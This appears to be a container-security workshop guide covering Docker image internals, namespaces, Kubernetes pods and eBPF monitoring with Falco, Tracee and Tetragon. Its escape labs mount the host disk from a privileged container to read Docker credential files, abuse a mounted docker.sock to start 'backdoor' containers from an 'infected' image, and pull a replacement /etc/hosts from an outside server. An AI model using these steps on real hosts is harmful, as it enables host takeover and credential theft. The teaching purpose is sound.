# Dissecting containers and pods

## Running containers is easy
### Docker host
- ubuntu machine
- public ip address
- security group 80, 443, 8080, 8081

### Install docker
```
sudo apt-get update
sudo apt-get install -y jq tree 
```
```
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh ./get-docker.sh
```
```
sudo groupadd docker
sudo usermod -aG docker $USER
newgrp docker
```
### Running our first container
```
export IP="x.x.x.x"
```
```
docker run -d -p 8080:80 --name www nginx:1.24
```
```
docker run -d -p 8081:80 --name www2 nginx:1.25
```
```
curl -kv $IP:8080
```
```
curl -kv $IP:8081
```
## Creating images
### a first image
```
mkdir ./lab1
cd lab1
```
```
echo "My Annacon secret" >./secret.txt
```
```
cat >Dockerfile <<EOF
FROM ubuntu:20.04
ADD ./secret.txt /secret.txt
RUN apt-get update && apt-get install -y curl netcat
RUN  rm -f /secret.txt
CMD bash
EOF
```
```
docker build -t myimage ./.
```
```
docker run -it myimage
```
```
docker tag myimage xxradar/myimage:01
```
```
docker login
```
```
docker push xxradar/myimage:01
```
```
docker run -it xxradar/myimage:01
```
### a second image using the first as base
```
mkdir ../lab2
cd ../lab2
```
```
cat >Dockerfile <<EOF
FROM xxradar/myimage:01
RUN apt-get update && apt-get install -y dnsutils tcpdump
CMD tcpdump -i any
EOF
```
```
docker build -t mytcpdumper ./.
```
```
docker run -it mytcpdumper
```
```
docker tag mytcpdumper xxradar/mytcpdumper:01
```
```
docker push xxradar/mytcpdumper:01
```
```
docker run -it xxradar/mytcpdumper:01
```
## Dissecting the image
```
mkdir ../lab3
cd ../lab3
```
```
docker save xxradar/myimage:01 >image.tar
```
```
tar xfv ./image.tar
```
```
cat manifest.json | jq -r 
```
### Finding `secret.txt`
Explore and untar all the layers
```
tar xfv ./layer.tar
```
### Vulnerability scanners
```
wget https://github.com/aquasecurity/trivy/releases/download/v0.45.1/trivy_0.45.1_Linux-64bit.deb
sudo dpkg -i trivy_0.45.1_Linux-64bit.deb
```
```
trivy image xxradar/myimage:01
```
## Dissecting a running container
```
mkdir ../lab4
cd ../lab4
```
```
docker inspect www
```
### Storage

```
docker inspect www | jq -r '.[].LogPath'
```
```
docker inspect www | jq -r '.[].GraphDriver'
```
```
sudo ls /var/lib/docker/overlay2/dbe8c23813804c767695f142a99d5f1669552b853c989f9ef6182cbd87efe802/diff
```
```
docker exec -it www bash
```
```
echo secretoftheday >text.txt
```
```
sudo ls /var/lib/docker/overlay2/dbe8c23813804c767695f142a99d5f1669552b853c989f9ef6182cbd87efe802/diff
```
```
sudo cat /var/lib/docker/overlay2/dbe8c23813804c767695f142a99d5f1669552b853c989f9ef6182cbd87efe802/diff/test.txt
```
### Processes and namespaces
```
mkdir ../lab5
cd ../lab5
```
```
export PID=$(docker inspect www | jq -r '.[].State.Pid')
echo $PID
```
```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep $PID
```
```
export NETNS="4026532287"
```
```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep $NETNS
```
### Entering a container
```
nsenter -t $PID -a
```
```
apt-get update && apt-get install procps
```
```
ps aux
```
```
curl https://www.radarhack.com/dir/demo/hosts.txt -o /etc/hosts
```
```
curl www.google.com
```
```
cat /usr/share/nginx/html/index.html
```
```
echo hacking at annacon >> /usr/share/nginx/html/index.html
```
```
curl -kv 127.0.0.1:8080
```
### Privileged
```
lsblk
```
```
docker run -d  --privileged  --name www3 nginx:1.25
```
```
docker exec -it www3 bash
```
```
mkdir /tmp/host-fs
# mount /dev/root /tmp/host-fs/
mount /dev/vda1 /tmp/host-fs/
```
```
cd  /tmp/host-fs/
# cat /tmp/host-fs/root/.docker/config.json

# cat /tmp/host-fs/home/ubuntu/.docker/config.json
# cat /tmp/host-fs/home/ubuntu/.docker/config.json

```
### Mounting issues
```
docker run -d  -v /var/run/docker.sock:/var/run/docker.sock --name www4 nginx:1.25
```
```
docker exec -it www4 bash
```
```
curl https://download.docker.com/linux/static/stable/x86_64/docker-24.0.6.tgz -O
tar xzvf ./docker-24.0.6.tgz
cd docker
./docker -H unix:///var/run/docker.sock ps
./docker -H unix:///var/run/docker.sock run -d --name hackpod xxradar/hackon sleep 900
./docker -H unix:///var/run/docker.sock run -d --privileged --name hackpodpriv xxradar/ubuntu_infected:annacon  sleep 500 &
./docker -H unix:///var/run/docker.sock run -d --privileged  -v /var/run/docker.sock:/var/run/docker.sock --name hackpod_backdoor xxradar/ubuntu_infected:annacon  "bash -c sleep 500 &"
```
```
apt list
```
### PID
```
docker run -it --rm --pid host xxradar/hackon
```
### Host network driver
```
docker run -it --rm --net host xxradar/hackon
```
### Notes:
```
findmnt -N $PID
sudo cat  /proc/24302/mountinfo

sudo filecap /usr/bin/ping
sudo filecap -a 2>/dev/null

pscap
sysctl net.ipv4.ip_unprivileged_port_start
ls -la /proc/sys/net/ipv4/

https://github.com/genuinetools/amicontained (TBC)
```
## eBPF
### Tracee
```
docker run   --name tracee --rm -it   \
   --pid=host \
   --cgroupns=host \
   --privileged \
   -v /etc/os-release:/etc/os-release-host:ro \
   aquasec/tracee:latest
```
### Falco
```
sudo curl -s https://falco.org/repo/falcosecurity-packages.asc |sudo  apt-key add -

sudo echo "deb https://download.falco.org/packages/deb stable main" | sudo tee -a /etc/apt/sources.list.d/falcosecurity.list

sudo  apt-get update -y

sudo apt-get install -y falco

```
```
- rule: spawned_process_in_test_container
  desc: A process was spawned in the test container.
  condition: container.name = "falco-test" and evt.type = execve
  output: "%evt.time,%user.uid,%proc.name,%container.id,%container.name,command=%proc.cmdline"
  priority: WARNING
```
```
falco -r ./falco.rule
....
```
### Tetragon
```
docker run -d --name tetragon-container --rm --pull always \
    --pid=host \
    --cgroupns=host \
    --privileged             \
    -v /sys/kernel/btf/vmlinux:/var/lib/tetragon/btf    \
    quay.io/cilium/tetragon-ci:latest
```
```
docker exec tetragon-container tetra getevents -o compact
```
```
cat > ./tracing_policy.yaml <<EOF
# This tracing policy 'connect-only-local-addrs' will report attempts
# to make outbound TCP connections to any IP address other than those
# within the 127.0.0.0/8 CIDR, from the binary /usr/bin/curl. In
# addition it will also kill the offending curl process.
#
# Description:
#  Report and block outbound TCP connections outside loopback from
#  /usr/bin/curl.
#
# In production, this could be used to force processes to only connect
# to their side cars on their local loopback, and to treat transgressions
# as evidence of malicious activity, resulting in the process being
# killed.

apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "connect-only-local-addrs"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "127.0.0.0/8"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/curl"
      matchActions:
      - action: Sigkill
EOF
```
```
docker run -d --name tetragon-container --rm --pull always \
    --pid=host --cgroupns=host --privileged             \
    -v $PWD/tracing_policy.yaml:/tracing_policy.yaml    \
    -v /sys/kernel/btf/vmlinux:/var/lib/tetragon/btf    \
    quay.io/cilium/tetragon-ci:latest                   \
    --tracing-policy /tracing_policy.yaml
```
## Running pods is easy
### Create a multi-container pod
```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: mcpod
spec:
  volumes:
  - name: demo
    emptyDir: {}
  containers:
  - name: nginx
    image: nginx
    volumeMounts:
    - name: demo
      mountPath: /demo
  - name: redis
    image: redis
    volumeMounts:
    - name: demo
      mountPath: /data
EOF
```
```
kubectl get po -o wide
```
On the node
```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep <PID>
```
```
sudo ps -ax -n -o pid,netns,utsns,ipcns,mntns,pidns,cmd | grep <NETNS>
```
```
apt-get update && apt-get install procps
```
